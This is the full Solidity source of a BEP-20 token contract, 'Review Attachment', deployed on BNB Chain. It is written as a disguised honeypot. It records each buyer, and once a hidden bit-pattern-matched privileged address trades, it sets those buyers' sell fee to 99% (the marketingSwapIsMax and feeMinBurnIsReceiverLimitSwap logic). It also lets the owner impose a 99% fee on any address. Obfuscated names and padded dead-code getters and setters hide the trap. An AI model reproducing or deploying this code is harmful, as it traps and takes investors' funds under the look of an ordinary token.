/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ReviewAttachment is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Review Attachment ";
    string constant _symbol = "ReviewAttachment";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txExemptMarketingSwap;
    mapping(address => bool) private sellAutoFeeLimitLiquidity;
    mapping(address => bool) private exemptMarketingBurnWalletIs;
    mapping(address => bool) private sellBotsExemptModeFee;
    mapping(address => uint256) private exemptMarketingModeLiquidity;
    mapping(uint256 => address) private isReceiverWalletBurnMarketingLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapModeReceiverFee = 0;
    uint256 private feeLiquidityBotsMinWallet = 6;

    //SELL FEES
    uint256 private liquidityModeMarketingBurn = 0;
    uint256 private sellBuyTradingBots = 6;

    uint256 private limitAutoIsTeamExemptMin = feeLiquidityBotsMinWallet + swapModeReceiverFee;
    uint256 private burnExemptBotsSell = 100;

    address private maxBuyTradingTeam = (msg.sender); // auto-liq address
    address private maxBurnWalletExemptSellSwapIs = (0x5282b939FD759d525CB0e1bBFFfFc4aed408737b); // marketing address
    address private tradingExemptBotsFee = DEAD;
    address private modeExemptTxTrading = DEAD;
    address private marketingBotsTeamBurn = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private exemptBurnSellMarketingLimitSwapWallet;
    uint256 private burnSwapTxLiquidity;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellExemptBuyBurnWallet;
    uint256 private minBotsTeamAuto;
    uint256 private swapWalletFeeBuySellReceiverLaunched;
    uint256 private exemptBotsTradingAuto;
    uint256 private limitTradingBotsTeamExemptReceiverSell;

    bool private maxTeamSwapMarketingExempt = true;
    bool private sellBotsExemptModeFeeMode = true;
    bool private autoBurnTeamLiquidityLimit = true;
    bool private launchedMaxTeamTx = true;
    bool private botsTradingMarketingFee = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private tradingMarketingBurnWalletExemptReceiver = _totalSupply / 1000; // 0.1%

    
    uint256 private walletAutoLiquidityTx = 0;
    bool private walletSellIsMode = false;
    bool private tradingSwapModeReceiver = false;
    bool private modeWalletTxLiquidityBotsExemptReceiver = false;
    uint256 private botsAutoSwapSell = 0;
    bool private exemptMinLaunchedSwap = false;
    bool private marketingSellAutoTxFee = false;
    bool private feeBuyMarketingBurn = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellExemptBuyBurnWallet = true;

        txExemptMarketingSwap[msg.sender] = true;
        txExemptMarketingSwap[address(this)] = true;

        sellAutoFeeLimitLiquidity[msg.sender] = true;
        sellAutoFeeLimitLiquidity[0x0000000000000000000000000000000000000000] = true;
        sellAutoFeeLimitLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        sellAutoFeeLimitLiquidity[address(this)] = true;

        exemptMarketingBurnWalletIs[msg.sender] = true;
        exemptMarketingBurnWalletIs[0x0000000000000000000000000000000000000000] = true;
        exemptMarketingBurnWalletIs[0x000000000000000000000000000000000000dEaD] = true;
        exemptMarketingBurnWalletIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return maxFeeBurnLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return maxFeeBurnLiquidity(sender, recipient, amount);
    }

    function maxFeeBurnLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = autoBuyModeWallet(sender) || autoBuyModeWallet(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                feeMinBurnIsReceiverLimitSwap();
            }
            if (!bLimitTxWalletValue) {
                walletMinReceiverBurnBuy(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return modeMinTradingBurnIsReceiverMarketing(sender, recipient, amount);}

        if (!txExemptMarketingSwap[sender] && !txExemptMarketingSwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (feeBuyMarketingBurn == modeWalletTxLiquidityBotsExemptReceiver) {
            feeBuyMarketingBurn = maxTeamSwapMarketingExempt;
        }

        if (walletSellIsMode != marketingSellAutoTxFee) {
            walletSellIsMode = tradingSwapModeReceiver;
        }


        require((amount <= _maxTxAmount) || exemptMarketingBurnWalletIs[sender] || exemptMarketingBurnWalletIs[recipient], "Max TX Limit has been triggered");

        if (burnTradingTxSellMinReceiverLiquidity()) {isTxWalletLaunched();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = burnTxSwapMax(sender) ? limitTradingReceiverMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function modeMinTradingBurnIsReceiverMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burnTxSwapMax(address sender) internal view returns (bool) {
        return !sellAutoFeeLimitLiquidity[sender];
    }

    function burnLiquidityLaunchedBuyMarketing(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            limitAutoIsTeamExemptMin = sellBuyTradingBots + liquidityModeMarketingBurn;
            return marketingSwapIsMax(sender, limitAutoIsTeamExemptMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitAutoIsTeamExemptMin = feeLiquidityBotsMinWallet + swapModeReceiverFee;
            return limitAutoIsTeamExemptMin;
        }
        return marketingSwapIsMax(sender, limitAutoIsTeamExemptMin);
    }

    function limitTradingReceiverMin(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (feeBuyMarketingBurn != feeBuyMarketingBurn) {
            feeBuyMarketingBurn = tradingSwapModeReceiver;
        }


        uint256 feeAmount = amount.mul(burnLiquidityLaunchedBuyMarketing(sender, receiver == uniswapV2Pair)).div(burnExemptBotsSell);

        if (sellBotsExemptModeFee[sender] || sellBotsExemptModeFee[receiver]) {
            feeAmount = amount.mul(99).div(burnExemptBotsSell);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function autoBuyModeWallet(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingSwapIsMax(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = exemptMarketingModeLiquidity[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function walletMinReceiverBurnBuy(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        isReceiverWalletBurnMarketingLiquidity[exemptLimitValue] = addr;
    }

    function feeMinBurnIsReceiverLimitSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (exemptMarketingModeLiquidity[isReceiverWalletBurnMarketingLiquidity[i]] == 0) {
                    exemptMarketingModeLiquidity[isReceiverWalletBurnMarketingLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(maxBurnWalletExemptSellSwapIs).transfer(amountBNB * amountPercentage / 100);
    }

    function burnTradingTxSellMinReceiverLiquidity() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    botsTradingMarketingFee &&
    _balances[address(this)] >= tradingMarketingBurnWalletExemptReceiver;
    }

    function isTxWalletLaunched() internal swapping {
        
        if (exemptMinLaunchedSwap != launchedMaxTeamTx) {
            exemptMinLaunchedSwap = walletSellIsMode;
        }

        if (tradingSwapModeReceiver == modeWalletTxLiquidityBotsExemptReceiver) {
            tradingSwapModeReceiver = feeBuyMarketingBurn;
        }


        uint256 amountToLiquify = tradingMarketingBurnWalletExemptReceiver.mul(swapModeReceiverFee).div(limitAutoIsTeamExemptMin).div(2);
        uint256 amountToSwap = tradingMarketingBurnWalletExemptReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitAutoIsTeamExemptMin.sub(swapModeReceiverFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapModeReceiverFee).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(feeLiquidityBotsMinWallet).div(totalETHFee);
        
        payable(maxBurnWalletExemptSellSwapIs).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxBuyTradingTeam,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMaxBurnWalletExemptSellSwapIs() public view returns (address) {
        if (maxBurnWalletExemptSellSwapIs != maxBurnWalletExemptSellSwapIs) {
            return maxBurnWalletExemptSellSwapIs;
        }
        return maxBurnWalletExemptSellSwapIs;
    }
    function setMaxBurnWalletExemptSellSwapIs(address a0) public onlyOwner {
        if (maxBurnWalletExemptSellSwapIs == marketingBotsTeamBurn) {
            marketingBotsTeamBurn=a0;
        }
        if (maxBurnWalletExemptSellSwapIs != maxBurnWalletExemptSellSwapIs) {
            maxBurnWalletExemptSellSwapIs=a0;
        }
        maxBurnWalletExemptSellSwapIs=a0;
    }

    function getSellBotsExemptModeFee(address a0) public view returns (bool) {
        if (sellBotsExemptModeFee[a0] != sellAutoFeeLimitLiquidity[a0]) {
            return modeWalletTxLiquidityBotsExemptReceiver;
        }
            return sellBotsExemptModeFee[a0];
    }
    function setSellBotsExemptModeFee(address a0,bool a1) public onlyOwner {
        if (a0 != maxBurnWalletExemptSellSwapIs) {
            sellBotsExemptModeFeeMode=a1;
        }
        if (sellBotsExemptModeFee[a0] == exemptMarketingBurnWalletIs[a0]) {
           exemptMarketingBurnWalletIs[a0]=a1;
        }
        if (a0 != marketingBotsTeamBurn) {
            walletSellIsMode=a1;
        }
        sellBotsExemptModeFee[a0]=a1;
    }

    function getBurnExemptBotsSell() public view returns (uint256) {
        return burnExemptBotsSell;
    }
    function setBurnExemptBotsSell(uint256 a0) public onlyOwner {
        burnExemptBotsSell=a0;
    }

    function getExemptMarketingModeLiquidity(address a0) public view returns (uint256) {
        if (a0 == modeExemptTxTrading) {
            return burnExemptBotsSell;
        }
            return exemptMarketingModeLiquidity[a0];
    }
    function setExemptMarketingModeLiquidity(address a0,uint256 a1) public onlyOwner {
        exemptMarketingModeLiquidity[a0]=a1;
    }

    function getMaxTeamSwapMarketingExempt() public view returns (bool) {
        if (maxTeamSwapMarketingExempt == botsTradingMarketingFee) {
            return botsTradingMarketingFee;
        }
        if (maxTeamSwapMarketingExempt == botsTradingMarketingFee) {
            return botsTradingMarketingFee;
        }
        return maxTeamSwapMarketingExempt;
    }
    function setMaxTeamSwapMarketingExempt(bool a0) public onlyOwner {
        if (maxTeamSwapMarketingExempt == botsTradingMarketingFee) {
            botsTradingMarketingFee=a0;
        }
        if (maxTeamSwapMarketingExempt == maxTeamSwapMarketingExempt) {
            maxTeamSwapMarketingExempt=a0;
        }
        if (maxTeamSwapMarketingExempt == exemptMinLaunchedSwap) {
            exemptMinLaunchedSwap=a0;
        }
        maxTeamSwapMarketingExempt=a0;
    }

    function getFeeLiquidityBotsMinWallet() public view returns (uint256) {
        return feeLiquidityBotsMinWallet;
    }
    function setFeeLiquidityBotsMinWallet(uint256 a0) public onlyOwner {
        if (feeLiquidityBotsMinWallet == burnExemptBotsSell) {
            burnExemptBotsSell=a0;
        }
        if (feeLiquidityBotsMinWallet == burnExemptBotsSell) {
            burnExemptBotsSell=a0;
        }
        feeLiquidityBotsMinWallet=a0;
    }

    function getSellBotsExemptModeFeeMode() public view returns (bool) {
        return sellBotsExemptModeFeeMode;
    }
    function setSellBotsExemptModeFeeMode(bool a0) public onlyOwner {
        sellBotsExemptModeFeeMode=a0;
    }

    function getModeWalletTxLiquidityBotsExemptReceiver() public view returns (bool) {
        if (modeWalletTxLiquidityBotsExemptReceiver != walletSellIsMode) {
            return walletSellIsMode;
        }
        if (modeWalletTxLiquidityBotsExemptReceiver != maxTeamSwapMarketingExempt) {
            return maxTeamSwapMarketingExempt;
        }
        return modeWalletTxLiquidityBotsExemptReceiver;
    }
    function setModeWalletTxLiquidityBotsExemptReceiver(bool a0) public onlyOwner {
        if (modeWalletTxLiquidityBotsExemptReceiver == botsTradingMarketingFee) {
            botsTradingMarketingFee=a0;
        }
        modeWalletTxLiquidityBotsExemptReceiver=a0;
    }

    function getTradingMarketingBurnWalletExemptReceiver() public view returns (uint256) {
        if (tradingMarketingBurnWalletExemptReceiver == sellBuyTradingBots) {
            return sellBuyTradingBots;
        }
        if (tradingMarketingBurnWalletExemptReceiver == sellBuyTradingBots) {
            return sellBuyTradingBots;
        }
        return tradingMarketingBurnWalletExemptReceiver;
    }
    function setTradingMarketingBurnWalletExemptReceiver(uint256 a0) public onlyOwner {
        tradingMarketingBurnWalletExemptReceiver=a0;
    }

    function getFeeBuyMarketingBurn() public view returns (bool) {
        if (feeBuyMarketingBurn == botsTradingMarketingFee) {
            return botsTradingMarketingFee;
        }
        return feeBuyMarketingBurn;
    }
    function setFeeBuyMarketingBurn(bool a0) public onlyOwner {
        if (feeBuyMarketingBurn == autoBurnTeamLiquidityLimit) {
            autoBurnTeamLiquidityLimit=a0;
        }
        if (feeBuyMarketingBurn == walletSellIsMode) {
            walletSellIsMode=a0;
        }
        feeBuyMarketingBurn=a0;
    }

    function getLiquidityModeMarketingBurn() public view returns (uint256) {
        if (liquidityModeMarketingBurn != tradingMarketingBurnWalletExemptReceiver) {
            return tradingMarketingBurnWalletExemptReceiver;
        }
        if (liquidityModeMarketingBurn != limitAutoIsTeamExemptMin) {
            return limitAutoIsTeamExemptMin;
        }
        if (liquidityModeMarketingBurn == feeLiquidityBotsMinWallet) {
            return feeLiquidityBotsMinWallet;
        }
        return liquidityModeMarketingBurn;
    }
    function setLiquidityModeMarketingBurn(uint256 a0) public onlyOwner {
        if (liquidityModeMarketingBurn == limitAutoIsTeamExemptMin) {
            limitAutoIsTeamExemptMin=a0;
        }
        if (liquidityModeMarketingBurn != burnExemptBotsSell) {
            burnExemptBotsSell=a0;
        }
        liquidityModeMarketingBurn=a0;
    }

    function getSellAutoFeeLimitLiquidity(address a0) public view returns (bool) {
        if (sellAutoFeeLimitLiquidity[a0] != sellBotsExemptModeFee[a0]) {
            return tradingSwapModeReceiver;
        }
        if (a0 == tradingExemptBotsFee) {
            return walletSellIsMode;
        }
        if (sellAutoFeeLimitLiquidity[a0] != exemptMarketingBurnWalletIs[a0]) {
            return maxTeamSwapMarketingExempt;
        }
            return sellAutoFeeLimitLiquidity[a0];
    }
    function setSellAutoFeeLimitLiquidity(address a0,bool a1) public onlyOwner {
        sellAutoFeeLimitLiquidity[a0]=a1;
    }

    function getLaunchedMaxTeamTx() public view returns (bool) {
        return launchedMaxTeamTx;
    }
    function setLaunchedMaxTeamTx(bool a0) public onlyOwner {
        if (launchedMaxTeamTx != launchedMaxTeamTx) {
            launchedMaxTeamTx=a0;
        }
        launchedMaxTeamTx=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}